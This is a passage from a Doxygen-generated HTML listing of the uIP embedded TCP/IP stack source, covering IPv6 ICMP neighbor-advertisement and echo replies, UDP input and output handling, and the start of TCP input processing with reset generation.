<a name="l01034"></a>01034         <a class="code" href="a00132.html#88460bea09a462d0e22511cb567eee14">uip_neighbor_add</a>(<a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;srcipaddr, &amp;(<a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;options[2]));
<a name="l01035"></a>01035       }
<a name="l01036"></a>01036       
<a name="l01037"></a>01037       <span class="comment">/* We should now send a neighbor advertisement back to where the</span>
<a name="l01038"></a>01038 <span class="comment">         neighbor solicication came from. */</span>
<a name="l01039"></a>01039       <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;type = <a class="code" href="a00150.html#g62c03e0a308cc23929a80fe8d8f9dc1e">ICMP6_NEIGHBOR_ADVERTISEMENT</a>;
<a name="l01040"></a>01040       <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;flags = <a class="code" href="a00150.html#g1d3211dbbdfb22d6a47b60dddcf945e8">ICMP6_FLAG_S</a>; <span class="comment">/* Solicited flag. */</span>
<a name="l01041"></a>01041       
<a name="l01042"></a>01042       <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;reserved1 = <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;reserved2 = <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;reserved3 = 0;
<a name="l01043"></a>01043       
<a name="l01044"></a>01044       <a class="code" href="a00148.html#g769512993b7b27271909d6daa4748b60">uip_ipaddr_copy</a>(<a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;destipaddr, <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;srcipaddr);
<a name="l01045"></a>01045       <a class="code" href="a00148.html#g769512993b7b27271909d6daa4748b60">uip_ipaddr_copy</a>(<a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;srcipaddr, <a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a>);
<a name="l01046"></a>01046       <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;options[0] = <a class="code" href="a00150.html#g8387881de3a8bfd3c0d57b9d04ac9b7e">ICMP6_OPTION_TARGET_LINK_ADDRESS</a>;
<a name="l01047"></a>01047       <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;options[1] = 1;  <span class="comment">/* Options length, 1 = 8 bytes. */</span>
<a name="l01048"></a>01048       memcpy(&amp;(<a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;options[2]), &amp;<a class="code" href="a00150.html#g499bb98a0b4ae9a98553ede81317606d">uip_ethaddr</a>, <span class="keyword">sizeof</span>(<a class="code" href="a00150.html#g499bb98a0b4ae9a98553ede81317606d">uip_ethaddr</a>));
<a name="l01049"></a>01049       <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;icmpchksum = 0;
<a name="l01050"></a>01050       <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;icmpchksum = ~uip_icmp6chksum();
<a name="l01051"></a>01051       <span class="keywordflow">goto</span> send;
<a name="l01052"></a>01052       
<a name="l01053"></a>01053     }
<a name="l01054"></a>01054     <span class="keywordflow">goto</span> drop;
<a name="l01055"></a>01055   } <span class="keywordflow">else</span> <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;type == <a class="code" href="a00150.html#g4cc3e223b63f27b546d62e9a258dba5a">ICMP6_ECHO</a>) {
<a name="l01056"></a>01056     <span class="comment">/* ICMP echo (i.e., ping) processing. This is simple, we only</span>
<a name="l01057"></a>01057 <span class="comment">       change the ICMP type from ECHO to ECHO_REPLY and update the</span>
<a name="l01058"></a>01058 <span class="comment">       ICMP checksum before we return the packet. */</span>
<a name="l01059"></a>01059 
<a name="l01060"></a>01060     <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;type = <a class="code" href="a00150.html#g207d17b633cd095120a74bc1f2257b17">ICMP6_ECHO_REPLY</a>;
<a name="l01061"></a>01061     
<a name="l01062"></a>01062     <a class="code" href="a00148.html#g769512993b7b27271909d6daa4748b60">uip_ipaddr_copy</a>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destipaddr, <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcipaddr);
<a name="l01063"></a>01063     <a class="code" href="a00148.html#g769512993b7b27271909d6daa4748b60">uip_ipaddr_copy</a>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcipaddr, <a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a>);
<a name="l01064"></a>01064     <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;icmpchksum = 0;
<a name="l01065"></a>01065     <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;icmpchksum = ~uip_icmp6chksum();
<a name="l01066"></a>01066     
<a name="l01067"></a>01067     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#3983b45977630418d3038231aa8b68ed">icmp</a>.<a class="code" href="a00093.html#dc69abadd5aa07c7d74f9292db2cd93c">sent</a>);
<a name="l01068"></a>01068     <span class="keywordflow">goto</span> send;
<a name="l01069"></a>01069   } <span class="keywordflow">else</span> {
<a name="l01070"></a>01070     <a class="code" href="a00135.html#534d9e416324fb8ecca6b9cb4b1f6a6a">DEBUG_PRINTF</a>(<span class="stringliteral">"Unknown icmp6 message type %d\n"</span>, <a class="code" href="a00150.html#g4309376690872fa4beb4f025f5cc199b">ICMPBUF</a>-&gt;type);
<a name="l01071"></a>01071     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#3983b45977630418d3038231aa8b68ed">icmp</a>.<a class="code" href="a00093.html#5d8996950cdf3d8130cc3ad340eb9dff">drop</a>);
<a name="l01072"></a>01072     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#3983b45977630418d3038231aa8b68ed">icmp</a>.<a class="code" href="a00093.html#8da121d6e50992ec55778f9b2141552d">typeerr</a>);
<a name="l01073"></a>01073     <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"icmp: unknown ICMP message."</span>);
<a name="l01074"></a>01074     <span class="keywordflow">goto</span> drop;
<a name="l01075"></a>01075   }
<a name="l01076"></a>01076 
<a name="l01077"></a>01077   <span class="comment">/* End of IPv6 ICMP processing. */</span>
<a name="l01078"></a>01078   
<a name="l01079"></a>01079 <span class="preprocessor">#endif </span><span class="comment">/* !UIP_CONF_IPV6 */</span>
<a name="l01080"></a>01080 
<a name="l01081"></a>01081 <span class="preprocessor">#if UIP_UDP</span>
<a name="l01082"></a>01082 <span class="preprocessor"></span>  <span class="comment">/* UDP input processing. */</span>
<a name="l01083"></a>01083  udp_input:
<a name="l01084"></a>01084   <span class="comment">/* UDP processing is really just a hack. We don't do anything to the</span>
<a name="l01085"></a>01085 <span class="comment">     UDP/IP headers, but let the UDP application do all the hard</span>
<a name="l01086"></a>01086 <span class="comment">     work. If the application sets uip_slen, it has a packet to</span>
<a name="l01087"></a>01087 <span class="comment">     send. */</span>
<a name="l01088"></a>01088 <span class="preprocessor">#if UIP_UDP_CHECKSUMS</span>
<a name="l01089"></a>01089 <span class="preprocessor"></span>  <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> = <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> - <a class="code" href="a00150.html#g6f2b90c597ec23f39ec716ccec11233c">UIP_IPUDPH_LEN</a>;
<a name="l01090"></a>01090   <a class="code" href="a00150.html#g561b8eda32e059d4e7397f776268cc63">uip_appdata</a> = &amp;<a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + UIP_IPUDPH_LEN];
<a name="l01091"></a>01091   <span class="keywordflow">if</span>(<a class="code" href="a00150.html#gb9435261753469accec0c9bf8a5a2686">UDPBUF</a>-&gt;udpchksum != 0 &amp;&amp; <a class="code" href="a00150.html#g7023a34ba9e9d03b5fbedbcb32924453">uip_udpchksum</a>() != 0xffff) {
<a name="l01092"></a>01092     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#4f39f0fe6a820d260fe6cddf9ccaa832">udp</a>.<a class="code" href="a00093.html#5d8996950cdf3d8130cc3ad340eb9dff">drop</a>);
<a name="l01093"></a>01093     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#4f39f0fe6a820d260fe6cddf9ccaa832">udp</a>.<a class="code" href="a00093.html#7675e6b9adbddbd545d3aac8ca092fbb">chkerr</a>);
<a name="l01094"></a>01094     <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"udp: bad checksum."</span>);
<a name="l01095"></a>01095     <span class="keywordflow">goto</span> drop;
<a name="l01096"></a>01096   }
<a name="l01097"></a>01097 <span class="preprocessor">#else </span><span class="comment">/* UIP_UDP_CHECKSUMS */</span>
<a name="l01098"></a>01098   <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> = <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> - UIP_IPUDPH_LEN;
<a name="l01099"></a>01099 <span class="preprocessor">#endif </span><span class="comment">/* UIP_UDP_CHECKSUMS */</span>
<a name="l01100"></a>01100 
<a name="l01101"></a>01101   <span class="comment">/* Demultiplex this UDP packet between the UDP "connections". */</span>
<a name="l01102"></a>01102   <span class="keywordflow">for</span>(<a class="code" href="a00095.html">uip_udp_conn</a> = &amp;<a class="code" href="a00150.html#geb533744817cf6695d75293369c2248b">uip_udp_conns</a>[0];
<a name="l01103"></a>01103       <a class="code" href="a00095.html">uip_udp_conn</a> &lt; &amp;<a class="code" href="a00150.html#geb533744817cf6695d75293369c2248b">uip_udp_conns</a>[<a class="code" href="a00153.html#g196379ceb1219a99f4495e41ccc9bbfb">UIP_UDP_CONNS</a>];
<a name="l01104"></a>01104       ++<a class="code" href="a00095.html">uip_udp_conn</a>) {
<a name="l01105"></a>01105     <span class="comment">/* If the local UDP port is non-zero, the connection is considered</span>
<a name="l01106"></a>01106 <span class="comment">       to be used. If so, the local port number is checked against the</span>
<a name="l01107"></a>01107 <span class="comment">       destination port number in the received packet. If the two port</span>
<a name="l01108"></a>01108 <span class="comment">       numbers match, the remote port number is checked if the</span>
<a name="l01109"></a>01109 <span class="comment">       connection is bound to a remote port. Finally, if the</span>
<a name="l01110"></a>01110 <span class="comment">       connection is bound to a remote IP address, the source IP</span>
<a name="l01111"></a>01111 <span class="comment">       address of the packet is checked. */</span>
<a name="l01112"></a>01112     <span class="keywordflow">if</span>(<a class="code" href="a00095.html">uip_udp_conn</a>-&gt;lport != 0 &amp;&amp;
<a name="l01113"></a>01113        <a class="code" href="a00150.html#gb9435261753469accec0c9bf8a5a2686">UDPBUF</a>-&gt;destport == <a class="code" href="a00095.html">uip_udp_conn</a>-&gt;lport &amp;&amp;
<a name="l01114"></a>01114        (<a class="code" href="a00095.html">uip_udp_conn</a>-&gt;rport == 0 ||
<a name="l01115"></a>01115         <a class="code" href="a00150.html#gb9435261753469accec0c9bf8a5a2686">UDPBUF</a>-&gt;srcport == <a class="code" href="a00095.html">uip_udp_conn</a>-&gt;rport) &amp;&amp;
<a name="l01116"></a>01116        (<a class="code" href="a00148.html#g210e629f7252e4bc8458cbdf260b3318">uip_ipaddr_cmp</a>(<a class="code" href="a00095.html">uip_udp_conn</a>-&gt;ripaddr, all_zeroes_addr) ||
<a name="l01117"></a>01117         <a class="code" href="a00148.html#g210e629f7252e4bc8458cbdf260b3318">uip_ipaddr_cmp</a>(<a class="code" href="a00095.html">uip_udp_conn</a>-&gt;ripaddr, all_ones_addr) ||
<a name="l01118"></a>01118         <a class="code" href="a00148.html#g210e629f7252e4bc8458cbdf260b3318">uip_ipaddr_cmp</a>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcipaddr, <a class="code" href="a00095.html">uip_udp_conn</a>-&gt;ripaddr))) {
<a name="l01119"></a>01119       <span class="keywordflow">goto</span> udp_found;
<a name="l01120"></a>01120     }
<a name="l01121"></a>01121   }
<a name="l01122"></a>01122   <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"udp: no matching connection found"</span>);
<a name="l01123"></a>01123   <span class="keywordflow">goto</span> drop;
<a name="l01124"></a>01124   
<a name="l01125"></a>01125  udp_found:
<a name="l01126"></a>01126   <a class="code" href="a00088.html">uip_conn</a> = <a class="code" href="a00160.html#g070d2ce7b6bb7e5c05602aa8c308d0c4">NULL</a>;
<a name="l01127"></a>01127   <a class="code" href="a00150.html#gb4ef6b00924990e7a293f66715b6d1d1">uip_flags</a> = <a class="code" href="a00150.html#g39ce739bd352d7e348e37395ce903e43">UIP_NEWDATA</a>;
<a name="l01128"></a>01128   <a class="code" href="a00150.html#ga05a3dde2048480fa3ab2a5961898d18">uip_sappdata</a> = <a class="code" href="a00150.html#g561b8eda32e059d4e7397f776268cc63">uip_appdata</a> = &amp;<a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + <a class="code" href="a00150.html#g6f2b90c597ec23f39ec716ccec11233c">UIP_IPUDPH_LEN</a>];
<a name="l01129"></a>01129   <a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> = 0;
<a name="l01130"></a>01130   <a class="code" href="a00160.html#g3d768e989e308144190ae1a5ddfa9726">UIP_UDP_APPCALL</a>();
<a name="l01131"></a>01131  udp_send:
<a name="l01132"></a>01132   <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> == 0) {
<a name="l01133"></a>01133     <span class="keywordflow">goto</span> drop;
<a name="l01134"></a>01134   }
<a name="l01135"></a>01135   <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> = <a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> + <a class="code" href="a00150.html#g6f2b90c597ec23f39ec716ccec11233c">UIP_IPUDPH_LEN</a>;
<a name="l01136"></a>01136 
<a name="l01137"></a>01137 <span class="preprocessor">#if UIP_CONF_IPV6</span>
<a name="l01138"></a>01138 <span class="preprocessor"></span>  <span class="comment">/* For IPv6, the IP length field does not include the IPv6 IP header</span>
<a name="l01139"></a>01139 <span class="comment">     length. */</span>
<a name="l01140"></a>01140   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[0] = ((<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> - <a class="code" href="a00150.html#g6bc12c6c7b56f73ce5d57abfdcdc6eb5">UIP_IPH_LEN</a>) &gt;&gt; 8);
<a name="l01141"></a>01141   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[1] = ((<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> - <a class="code" href="a00150.html#g6bc12c6c7b56f73ce5d57abfdcdc6eb5">UIP_IPH_LEN</a>) &amp; 0xff);
<a name="l01142"></a>01142 <span class="preprocessor">#else </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l01143"></a>01143   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[0] = (<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> &gt;&gt; 8);
<a name="l01144"></a>01144   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;len[1] = (<a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> &amp; 0xff);
<a name="l01145"></a>01145 <span class="preprocessor">#endif </span><span class="comment">/* UIP_CONF_IPV6 */</span>
<a name="l01146"></a>01146 
<a name="l01147"></a>01147   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ttl = <a class="code" href="a00095.html">uip_udp_conn</a>-&gt;ttl;
<a name="l01148"></a>01148   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;proto = <a class="code" href="a00150.html#gf72d7b9a737707dcfb2c41fec2b6792e">UIP_PROTO_UDP</a>;
<a name="l01149"></a>01149 
<a name="l01150"></a>01150   <a class="code" href="a00150.html#gb9435261753469accec0c9bf8a5a2686">UDPBUF</a>-&gt;udplen = <a class="code" href="a00148.html#g69a7a4951ff21b302267532c21ee78fc">HTONS</a>(<a class="code" href="a00150.html#g5b5615dc240daed20949c0fded2b4679">uip_slen</a> + <a class="code" href="a00150.html#gb948296aea6b6b3aa1f156799c4d479c">UIP_UDPH_LEN</a>);
<a name="l01151"></a>01151   <a class="code" href="a00150.html#gb9435261753469accec0c9bf8a5a2686">UDPBUF</a>-&gt;udpchksum = 0;
<a name="l01152"></a>01152 
<a name="l01153"></a>01153   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcport  = <a class="code" href="a00095.html">uip_udp_conn</a>-&gt;lport;
<a name="l01154"></a>01154   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destport = <a class="code" href="a00095.html">uip_udp_conn</a>-&gt;rport;
<a name="l01155"></a>01155 
<a name="l01156"></a>01156   <a class="code" href="a00148.html#g769512993b7b27271909d6daa4748b60">uip_ipaddr_copy</a>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcipaddr, <a class="code" href="a00150.html#g7d3673f52f5846b6961d23b150decd54">uip_hostaddr</a>);
<a name="l01157"></a>01157   <a class="code" href="a00148.html#g769512993b7b27271909d6daa4748b60">uip_ipaddr_copy</a>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destipaddr, <a class="code" href="a00095.html">uip_udp_conn</a>-&gt;ripaddr);
<a name="l01158"></a>01158    
<a name="l01159"></a>01159   <a class="code" href="a00150.html#g561b8eda32e059d4e7397f776268cc63">uip_appdata</a> = &amp;<a class="code" href="a00146.html#gb81e78f890dbbee50c533a9734b74fd9">uip_buf</a>[<a class="code" href="a00153.html#ge6f4a2453dbd8bc60e6a82774552366a">UIP_LLH_LEN</a> + <a class="code" href="a00150.html#g15f2617f7dc1713f9d10282125c6027b">UIP_IPTCPH_LEN</a>];
<a name="l01160"></a>01160 
<a name="l01161"></a>01161 <span class="preprocessor">#if UIP_UDP_CHECKSUMS</span>
<a name="l01162"></a>01162 <span class="preprocessor"></span>  <span class="comment">/* Calculate UDP checksum. */</span>
<a name="l01163"></a>01163   <a class="code" href="a00150.html#gb9435261753469accec0c9bf8a5a2686">UDPBUF</a>-&gt;udpchksum = ~(<a class="code" href="a00150.html#g7023a34ba9e9d03b5fbedbcb32924453">uip_udpchksum</a>());
<a name="l01164"></a>01164   <span class="keywordflow">if</span>(<a class="code" href="a00150.html#gb9435261753469accec0c9bf8a5a2686">UDPBUF</a>-&gt;udpchksum == 0) {
<a name="l01165"></a>01165     <a class="code" href="a00150.html#gb9435261753469accec0c9bf8a5a2686">UDPBUF</a>-&gt;udpchksum = 0xffff;
<a name="l01166"></a>01166   }
<a name="l01167"></a>01167 <span class="preprocessor">#endif </span><span class="comment">/* UIP_UDP_CHECKSUMS */</span>
<a name="l01168"></a>01168   
<a name="l01169"></a>01169   <span class="keywordflow">goto</span> ip_send_nolen;
<a name="l01170"></a>01170 <span class="preprocessor">#endif </span><span class="comment">/* UIP_UDP */</span>
<a name="l01171"></a>01171   
<a name="l01172"></a>01172   <span class="comment">/* TCP input processing. */</span>
<a name="l01173"></a>01173  tcp_input:
<a name="l01174"></a>01174   <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#e292b8977f6b81265bf14e1676face3e">tcp</a>.<a class="code" href="a00093.html#7f7bb2145afba5df00c6e10ddefa8ae1">recv</a>);
<a name="l01175"></a>01175 
<a name="l01176"></a>01176   <span class="comment">/* Start of TCP input header processing code. */</span>
<a name="l01177"></a>01177   
<a name="l01178"></a>01178   <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g85b65e38aa74eba18979156f97a94a87">uip_tcpchksum</a>() != 0xffff) {   <span class="comment">/* Compute and check the TCP</span>
<a name="l01179"></a>01179 <span class="comment">                                       checksum. */</span>
<a name="l01180"></a>01180     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#e292b8977f6b81265bf14e1676face3e">tcp</a>.<a class="code" href="a00093.html#5d8996950cdf3d8130cc3ad340eb9dff">drop</a>);
<a name="l01181"></a>01181     <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#e292b8977f6b81265bf14e1676face3e">tcp</a>.<a class="code" href="a00093.html#7675e6b9adbddbd545d3aac8ca092fbb">chkerr</a>);
<a name="l01182"></a>01182     <a class="code" href="a00150.html#g013c3a06a8b58589a77f4a3442f89c2a">UIP_LOG</a>(<span class="stringliteral">"tcp: bad checksum."</span>);
<a name="l01183"></a>01183     <span class="keywordflow">goto</span> drop;
<a name="l01184"></a>01184   }
<a name="l01185"></a>01185   
<a name="l01186"></a>01186   
<a name="l01187"></a>01187   <span class="comment">/* Demultiplex this segment. */</span>
<a name="l01188"></a>01188   <span class="comment">/* First check any active connections. */</span>
<a name="l01189"></a>01189   <span class="keywordflow">for</span>(uip_connr = &amp;<a class="code" href="a00150.html#gf703683056d2bfa5c81fa157dcb20fe2">uip_conns</a>[0]; uip_connr &lt;= &amp;<a class="code" href="a00150.html#gf703683056d2bfa5c81fa157dcb20fe2">uip_conns</a>[<a class="code" href="a00153.html#gf5fe83be78b78b9e7d9e7f1e34ab1cc5">UIP_CONNS</a> - 1];
<a name="l01190"></a>01190       ++uip_connr) {
<a name="l01191"></a>01191     <span class="keywordflow">if</span>(uip_connr-&gt;tcpstateflags != <a class="code" href="a00150.html#g28eda870cff3d8e3cf2949e6f57a502b">UIP_CLOSED</a> &amp;&amp;
<a name="l01192"></a>01192        <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destport == uip_connr-&gt;lport &amp;&amp;
<a name="l01193"></a>01193        <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcport == uip_connr-&gt;rport &amp;&amp;
<a name="l01194"></a>01194        <a class="code" href="a00148.html#g210e629f7252e4bc8458cbdf260b3318">uip_ipaddr_cmp</a>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;srcipaddr, uip_connr-&gt;ripaddr)) {
<a name="l01195"></a>01195       <span class="keywordflow">goto</span> found;
<a name="l01196"></a>01196     }
<a name="l01197"></a>01197   }
<a name="l01198"></a>01198 
<a name="l01199"></a>01199   <span class="comment">/* If we didn't find and active connection that expected the packet,</span>
<a name="l01200"></a>01200 <span class="comment">     either this packet is an old duplicate, or this is a SYN packet</span>
<a name="l01201"></a>01201 <span class="comment">     destined for a connection in LISTEN. If the SYN flag isn't set,</span>
<a name="l01202"></a>01202 <span class="comment">     it is an old packet and we send a RST. */</span>
<a name="l01203"></a>01203   <span class="keywordflow">if</span>((<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags &amp; <a class="code" href="a00150.html#g1425d4a0c2760adb653a04c0fb137a8d">TCP_CTL</a>) != <a class="code" href="a00150.html#g6020613f5062417d9811cfa837215c83">TCP_SYN</a>) {
<a name="l01204"></a>01204     <span class="keywordflow">goto</span> reset;
<a name="l01205"></a>01205   }
<a name="l01206"></a>01206   
<a name="l01207"></a>01207   tmp16 = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;destport;
<a name="l01208"></a>01208   <span class="comment">/* Next, check listening connections. */</span>
<a name="l01209"></a>01209   <span class="keywordflow">for</span>(c = 0; c &lt; <a class="code" href="a00153.html#g8f4ebd8ef6c0ea665ed351d87fec09fd">UIP_LISTENPORTS</a>; ++c) {
<a name="l01210"></a>01210     <span class="keywordflow">if</span>(tmp16 == <a class="code" href="a00150.html#g236d5c7872f59c8fe7b701c7252b976e">uip_listenports</a>[c])
<a name="l01211"></a>01211       <span class="keywordflow">goto</span> found_listen;
<a name="l01212"></a>01212   }
<a name="l01213"></a>01213   
<a name="l01214"></a>01214   <span class="comment">/* No matching connection found, so we send a RST packet. */</span>
<a name="l01215"></a>01215   <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#e292b8977f6b81265bf14e1676face3e">tcp</a>.<a class="code" href="a00093.html#e9205a565ea3c911a785fc4e87c91a58">synrst</a>);
<a name="l01216"></a>01216  reset:
<a name="l01217"></a>01217 
<a name="l01218"></a>01218   <span class="comment">/* We do not send resets in response to resets. */</span>
<a name="l01219"></a>01219   <span class="keywordflow">if</span>(<a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags &amp; <a class="code" href="a00150.html#g5ca559def464ef20d8b1f7d32f2f160d">TCP_RST</a>) {
<a name="l01220"></a>01220     <span class="keywordflow">goto</span> drop;
<a name="l01221"></a>01221   }
<a name="l01222"></a>01222 
<a name="l01223"></a>01223   <a class="code" href="a00150.html#g9c0814ed491fa452ec97910c0728d410">UIP_STAT</a>(++<a class="code" href="a00150.html#g9ee50a40597e67fce96541ab56c3b712">uip_stat</a>.<a class="code" href="a00093.html#e292b8977f6b81265bf14e1676face3e">tcp</a>.<a class="code" href="a00093.html#b6e9a75167bdddd561373bc5b6ef501c">rst</a>);
<a name="l01224"></a>01224   
<a name="l01225"></a>01225   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;flags = <a class="code" href="a00150.html#g5ca559def464ef20d8b1f7d32f2f160d">TCP_RST</a> | <a class="code" href="a00150.html#g44b3b1ab31a403ba28ec135adfcbefef">TCP_ACK</a>;
<a name="l01226"></a>01226   <a class="code" href="a00149.html#g12a33f0c09711167bdf3dd7d7cf8c5a1">uip_len</a> = <a class="code" href="a00150.html#g15f2617f7dc1713f9d10282125c6027b">UIP_IPTCPH_LEN</a>;
<a name="l01227"></a>01227   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;tcpoffset = 5 &lt;&lt; 4;
<a name="l01228"></a>01228 
<a name="l01229"></a>01229   <span class="comment">/* Flip the seqno and ackno fields in the TCP header. */</span>
<a name="l01230"></a>01230   c = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[3];
<a name="l01231"></a>01231   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[3] = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[3];
<a name="l01232"></a>01232   <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;ackno[3] = c;
<a name="l01233"></a>01233   
<a name="l01234"></a>01234   c = <a class="code" href="a00150.html#g24f52ac52d6e714cb04a5aa01be3bdd0">BUF</a>-&gt;seqno[2];
